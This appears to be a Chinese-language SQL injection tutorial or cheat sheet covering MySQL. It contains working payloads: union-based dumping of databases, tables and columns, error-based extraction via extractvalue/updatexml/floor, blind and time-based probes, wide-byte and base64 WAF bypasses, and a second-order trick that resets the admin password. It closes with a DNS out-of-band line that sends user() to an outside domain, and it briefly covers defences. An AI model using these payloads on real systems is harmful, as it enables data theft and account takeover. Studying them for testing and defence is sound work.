## SQL注入

### SQL注入有关函数

```
concat(1,2,3,n) 将多个两个字段进行拼接
instr ('marray lili','lili') 在第一个字符串中查找第二个字符串中的位置，存在返回位置，不存在返回0
ucase() 转大写
lcase() 转小写
left('hello',3);     从左到右获取三个字符                       
length() 获取字符串长度 用于盲注          
trim() 去除字符串两端的空格
substr(str,start,end) 从字符串start开始end结束截取end -start个字符串
substring(str,start,end) 从字符串start开始end结束截取end -start个字符串
substr() / mid() 函数功能相同
mid()
replace('hello java','java','php'); 替换为hello php
strcmp(str1,str2) 
	str1>str2 ascii 返回-1 
	str1 > str2     返回1 
	str1 == str2	返回0
if(表达式,true执行的代码,false执行的代码) 盲注用的比较多
ord()、ascii()
```
### into outfile、into dumpfile、load_file三个函数的区别

```
into outfile()   

	outfile对导出内容中的\n等特殊字符进行了转义，并且在文件内容的末尾增加了一个新行
into dumpfile()  
	dumpfile对文件内容是原意写入，未做任何转移和增加(所以进行udf提权的时候使用的是into dumpfile()
	outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径，如果有addslashes() 进行转义，直接gg
load_file()
	load_file，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\	
```

### 前言

```
SQL注入(SQL Injection) 即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息
SQL注入是一种常见的Web安全漏洞,攻击者利用这个问题,可以访问或修改数据,或者利用潜在的数据库漏洞进行攻击
```

### SQL定义

```
SQL是操作数据库数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击
```

### 特点

```
1、广泛性
2、隐蔽性
3、危害大
4、操作方便
```

### 原理

```
SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。可以通过一个例子简单说明SQL注入攻击。假设某网站页面显示时URL为http://www.example.com?test=123，此时URL实际向服务器传递了值为123的变量test，这表明当前页面是对数据库进行动态查询的结果。由此，我们可以在URL中插入恶意的SQL语句并进行执行。另外，在网站开发过程中，开发人员使用动态字符串构造SQL语句，用来创建所需的应用，这种情况下SQL语句在程序的执行过程中被动态的构造使用，可以根据不同的条件产生不同的SQL语句，比如需要根据不同的要求来查询数据库中的字段。这样的开发过程其实为SQL注入攻击留下了很多的可乘之机。
```

### 注入分类

**1、按照注入点的数据类型(数据库) 分类**

**1). 数字型注入**

```
当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1，则会推导为string类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。
```

**数字型注入的例子**

```
1. select * from user where id = 1
2. select * from user where id = (1)
3. select * from user where id = 1 and 1 = 1
```



**2). 字符型注入**

```
当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合
```

**字符型注入的例子**

```
1. select * from user where id = '1';
2. select * from user where id = "1";
3. select * from user where id = ('1');
4. select * from user where id = ("1");
5. select * from user where id = (('1'));
6. select * from user where id = (("1"));
7. select * from user where id = '1 and 1 = 1';

注意: 必须要考虑 引号闭合和注释问题
```

**2、注入点的位置分类**

```
1.GET 注入
2.POST 注入
3.COOKIE 注入
4.HTTP 头部注入
```

**3、其他分类**

```
1.搜索框
2.登陆框
```

**获取敏感数据顺序思路**

```
库名 -> 表名 -> 字段名 -> 字段内容
```



### 注入过程

```
第一步：SQL注入点探测
第二步：收集后台数据库信息
第三步：猜解用户名和密码
第四步：查找Web后台管理入口
第五步：入侵和破坏
```

关于数据库的知识点

```
SQL运算符优先级
and 和 or
SQL中and(逻辑与运算) 的优先级要高于 or(逻辑或运算)
select 1=2 and 1=2 or 1=1       true

MySQL注释
#
--  (减减空格)
/*    */

```



### 判断注入点

```
1. ?id=1 
 
2. ?id=1'

3. ?id=1' and 1=1

4.?id=1' and 1=2 --+
  ?id=-1'   --+

5. ?id=1' and sleep(4) --+
```



### 攻击手法

```
1、联合查询注入
2、基于错误信息的注入
3、基于布尔的盲注---布尔型注入
4、基于时间的盲注---延时注入
5、宽字节注入
6、base64注入
7、二次注入
```



### 1.  联合查询   ( union select )

**需要有回显位置一般会将查询到的结果的对应字段进行回显**

```
1.获取当前表中有几个字段 order by  -- + 
2.得到回显位，在回显位置操作 获取所有数据库名 -- + 
union select xx,group_concat(schema_name) from information_schema.schemata 
3.通过数据库获取表名称
union select xx,group_concat(table_name) from information_schema.tables where table_schema=0x数据库名
4.通过表名获取字段名称
union select xx,group_concat(column_name) from information_schema.columns where table_schema=0x表名称
5.获取字段的值
union select xx,group_concat(自动1,自动n) from 表名称
```

### 2. XPATH 报错信息注入(公式)

​	报错信息要来自于数据库 (区别于脚本的错误, 服务器内部错误(500))

​	**在执行sql语句中，代码中有类似mysql_error()的函数**

```
1.extractvalue(1,concat())  内部需要两个参数  	返回结果限制字符长度是32位 可以使用 limit
2.updatexml(1,concat(),1) 内部需要需要三个参数   返回结果限制字符长度是32位 可以使用 limit
3.基于floor():mysql中用来取整的函数			   返回结果限制字符长度是32位 可以使用 limit
```



```
1.extractvalue()  从目标XML中返回包含所查询值的字符串
　格式:
　EXTRACTVALUE (XML_document, XPath_string);
　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
　　第二个参数：XPath_string (Xpath格式的字符串)
　　concat:返回结果为连接参数产生的字符串　
返回结果限制字符长度是32位
 
例子:
1). 获取MySQL的版本
	admin' and extractvalue(1, concat('^',version(),'^')) #   
```

```
2.updatexml()
UPDATEXML (XML_document, XPath_string, new_value); 
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
第三个参数：new_value，String格式，替换查找到的符合条件的数据
		
updatexml的最大长度是32位的，所以有所局限
如果密码长度超过了32位就不会被显示出来。

例子:
1). 获取MySQL的版本
	admin' and updatexml(1, concat('^',(select version()),'^'),3) #
```

```
3.基于floor():mysql中用来取整的函数
			select floor(2.35);	--2
			floor() 函数报错一定要有count()、group by、rand()
		
			kobe' and (select 2 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#
```



### 3.  布尔类型的盲注

```
利用布尔类型的状态
1. ?id=1' and 1=1 --+     true
2. ?id=1' and 1=2 --+     false
布尔盲注步骤:
1)使用length()函数获取数据库名字的长度
	?id=1' and length(database()) > 1 --+   如果有回显就说明是正确的
2)获取数据库名(单个截取substr/substring/mid ascii/ord and判断)
	后面的依次类推
```

### 4.  延时注入

```
时间盲注步骤
1)使用length()函数获取数据库名字的长度
	?id=1' and if((length(database()) > 1),sleep(3),sleep(0)) -- +   如果响应有延时就说明是正确的
2)获取数据库名(单个截取substr/string/mid ascii/ord if表达式判断)
```

### 5.  宽字节注入(' 逃逸)

```
当前端输入的参数为%df'、%df"进行闭合时，数据传到后端经过addslashes()处理之后会将' " 分别转译为\' \"，但是由于设置了gbk编码的原因，在汉字编码的范围内的两个字节都会重新编码为一个汉字，所以%df和\就会被编码为一个特殊的中文字符，单引号逃逸出来了.
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1�\'' LIMIT 0,1' at line 

分析 ''1�\'' LIMIT 0,1' ——>'1�\'' 这里�会将紧邻的字节\合并为一个字节

1.判断几个字段
	?id=1%df' order by 3 -- +	
	
以下为URL编码：
%27---------单引号
%20---------空格
%23---------#号
%5c---------/反斜杠
```

```
' " 分别转译为\' \" 绕过的三种方式 (mysql_escape_string,mysql_real_escape_string,addslashes)
是否设置gbk? 
    yes 使用宽字节注入
    no:	二次注入、注入点为整型、将字符串转换为16进制
```

### 6.  base64注入

```
base64注入是针对传递的参数被base64加密后的注入点进行注入。这种方式常用来绕过一些WAF(网站应用级入侵防御系统)的检测

把等号后面这部分进行base64加密
构造sql语句之后再base64编码
格式:
http://www.nanhack.com/payload/sql/base64.php
?id= LTEnIHVuaW9uIHNlbGVjdCAxLDIsMyw0LDUsNiw3LDggIw==
```

**SQL注入防范措施**

```
		转义+过滤
		预处理、参数化处理 PDO 也就是说前端输入的数据会被当作一个整体执行，
		也就是说不管你后面添加什么东西，都会被整体认为是一个整体\
		WAF web application firewall 
		启用云端防护
sqlmap工具使用入门及案例演示
		sqlmap :自动化测试数据库接管工具
```

### 7、二次注入
**原理:(一般二次注入只能通过代码审计进行挖掘)**

**示例:http://www.sqli.com/Less-24/**

```
数据库保存数据时，保存的是未经过滤的数据，在其他地方调用数据执行SQL查询，也未经过过滤，导致注入产生。

1. 用户向数据库插入恶意语句（即后端代码对语句进行了转义，mysql_escape_string,mysql_real_escape_string,addslashes

2. 数据库对直接取出的恶意数据并没有进行过滤

原理和思路:
	1、在注册用户时候，注册了一个admin'#的账户,注册之后的用户名会被addslashes、mysql_escape_string、mysql_real_escape_string等处理，使得原本的admin'#会被转义为admin\'#,直接插入到数据库中,插入的数据库时，插入的数据原本是admin\'#，但是插入数据时mysql默认会将\进行移除，这样我们最终插入的数据的用户名就变成了admin'#
	2、使用admin'#进行登录，进行检测时，默认会将admin'#会被转义为admin\'#,并带入到sql语句中进行查询，sql语句如下:
	SELECT * FROM users WHERE username='admin\'#' and password='root'
	由于mysql默认会将\去除，此时sql语句变成了如下:
	SELECT * FROM users WHERE username='admin'#' and password='root'
	这样注册的用户便成功登录了
	3、登录成功之后，在更改用户密码的时候,输入原密码，以及新密码root,传入之后执行的sql语句为:
	UPDATE users SET PASSWORD='lehend' where username='admin'#' and password='root' (由于提前闭合，导致更改的是admin账户的密码)
	需要注意的(更改密码这个功能点这里不能对传入的用户名进行转义，如果转义，更改的是admin'#用户的密码)
	UPDATE users SET PASSWORD='lehend' where username='admin\'#' and password='root'
```

### 8、mysql注入无回显如何解决?

​		**通过load_file 使用dns log进行外带**

```
LOAD_FILE(CONCAT('\\\\',(SELECT hex(user())),'.md5crack.cn\\foobar'))
```



